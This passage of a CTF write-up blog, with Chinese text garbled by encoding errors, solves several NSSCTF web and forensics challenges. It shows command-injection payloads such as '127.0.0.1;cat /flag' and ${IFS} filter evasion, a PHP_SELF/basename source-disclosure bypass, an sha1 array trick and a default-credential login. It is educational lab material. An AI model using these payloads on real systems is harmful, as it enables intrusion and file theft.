class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;103&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;104&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;105&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;106&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;107&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;108&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), </span><br><span class="line"></span><br><span class="line">aaa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aaa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(aaa)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¸€éƒ¨åˆ°ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\timu.pcapng&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><h4 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>PHP_SELFæ˜¯å– payloadçš„åé¢éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯/åé¢çš„</p><p>ä¸‹åˆ’çº¿å¯ä»¥ç”¨[ä»£æ›¿</p><p><code>index.php/utils.php/%89?show[source=1</code></p><p>%88ä¸ºéascllå­—ç¬¦ï¼Œä¸ºä»€ä¹ˆè¦ç”¨ä¸å¯è§å­—ç¬¦ï¼Ÿå¦‚æœæŠŠ%88æ¢æˆaï¼Œ$_SERVER[â€˜PHP_SELFâ€™]ä¼šè¯»å–åˆ°utils.php/aï¼Œbasenameå‡½æ•°å°±ä¼šåªè¯»å–aå¹¶è¿”å›aï¼Œhighlight_fileå°±ä¼šæ˜¾ç¤ºaè¿™ä¸ªæ–‡ä»¶çš„æºä»£ç ï¼Œè¿™-æ˜æ˜¾æ˜¯é”™è¯¯çš„ã€‚å¦‚æœbasenameå‡½æ•°åœ¨è¯»å–åˆ°éascllçš„å­—ç¬¦æ—¶ï¼Œå°±ä¼šåœæ­¢è¯»å–è·¯å¾„äº†ï¼Œå°±ä¼šè¿”å›utils.phpï¼Œå°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚ç„¶è€Œbasenameé‡åˆ°éasciiç ä¼šèˆå¼ƒ</p><p>index.php/utils.php/%89?show[source=1</p><h4 id="é¹¤åŸæ¯-2021-Middle-magic"><a href="#é¹¤åŸæ¯-2021-Middle-magic" class="headerlink" title="[é¹¤åŸæ¯ 2021]Middle magic"></a>[é¹¤åŸæ¯ 2021]Middle magic</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$aaa</span> = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="variable">$aaa</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$level_3</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$level_3</span>-&gt;result == <span class="variable">$result</span>) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  here is level <span class="number">2</span>here is level <span class="number">3</span>,<span class="keyword">do</span> you kown how to overcome it?success:NSSCTF&#123;<span class="number">1</span>cf861d8-a8f0-<span class="number">4</span>ed0-<span class="number">92e8</span>-<span class="number">2</span>c251e4b34a6&#125;</span><br><span class="line">ç¬¬ä¸€ç”¨æ¢è¡Œç¬¦ç»•è¿‡</span><br><span class="line">http:<span class="comment">//node4.anna.nssctf.cn:28689/?aaa=%0apass_the_level_1%23</span></span><br><span class="line">admin[]=<span class="number">1</span>&amp;root_pwd[]=a&amp;level_3=&#123;<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;result&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="MoeCTF-2021-babyRCE"><a href="#MoeCTF-2021-babyRCE" class="headerlink" title="[MoeCTF 2021]babyRCE"></a>[MoeCTF 2021]babyRCE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>http://node2.anna.nssctf.cn:28603/?rce=grep$&#123;IFS&#125;f$&#123;IFS&#125;fla?.php</code></p><p><code>http://node2.anna.nssctf.cn:28603/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p><p>ç”¨è¿™ä¸ªç©ºæ ¼<code>$&#123;IFS&#125;</code> å…¶ä»–å¥½åƒä¸è¡Œ</p><h4 id="LitCTF-2023-ä½œä¸šç®¡ç†ç³»ç»Ÿ"><a href="#LitCTF-2023-ä½œä¸šç®¡ç†ç³»ç»Ÿ" class="headerlink" title="[LitCTF 2023]ä½œä¸šç®¡ç†ç³»ç»Ÿ"></a>[LitCTF 2023]ä½œä¸šç®¡ç†ç³»ç»Ÿ</h4><p>çœ‹äº†ä¸€ä¸‹æ˜¯æ¢å§¬å¸ˆå‚…å‡ºçš„é¢˜ï¼Œä»¥ä¸ºå¾ˆéš¾ï¼Œå…¶å®æ²¡é‚£ä¹ˆéš¾ï¼Œå¼€å±€çœ‹åˆ°æºä»£ç æœ‰é»˜è®¤å£ä»¤ï¼Œadmin/admin</p><p>ç™»å½•ä¸Šå»ï¼Œç›´æ¥è¿™é‡Œä¸Šä¼ æ–‡ä»¶å°±è¡Œäº†ï¼Œ</p><p><img src="/images/others/image-20230616170455923.png" alt="image-20230616170455923"></p><p>ä¼šä¸Šä¼ åˆ°./ä¸‹ï¼Œä¹Ÿå°±æ˜¯å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è®¿é—®å°±è¡Œäº†ã€‚</p><p><img src="/images/others/image-20230616170646937.png" alt="image-20230616170646937"></p><h4 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h4><p>command=127.0.0.1;cat /flag&amp;ping=Ping</p><p><img src="/images/others/image-20230616171115155.png" alt="image-20230616171115155"></p><h4 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h4><p>åœ¨vim ç¼–è¾‘é”™è¯¯çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿ<code>.index.php.swp</code>æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹è½½``<a href="http://node2.anna.nssctf.cn:28510/.index.php.swp%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%A5%BD%E5%90%8E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%E4%BC%9A%E4%B9%B1%E7%A0%81%EF%BC%8C%E9%9A%8F%E4%BE%BF%E6%8B%96%E4%B8%AAlinux%E4%B8%8A%EF%BC%8C%E7%84%B6%E5%90%8E">http://node2.anna.nssctf.cn:28510/.index.php.swpï¼Œä¸‹è½½å¥½åï¼Œç›´æ¥æ‰“å¼€ä¼šä¹±ç ï¼Œéšä¾¿æ‹–ä¸ªlinuxä¸Šï¼Œç„¶å</a> vim -r æ–‡ä»¶ï¼Œå³å¯çœ‹åˆ°æºç </p><p><img src="/images/others/image-20230616171611477.png" alt="image-20230616171611477"></p><p><img src="/images/others/image-20230616171949147.png" alt="image-20230616171949147"></p><h4 id="LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼"><a href="#LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼" class="headerlink" title="[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼"></a>[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c 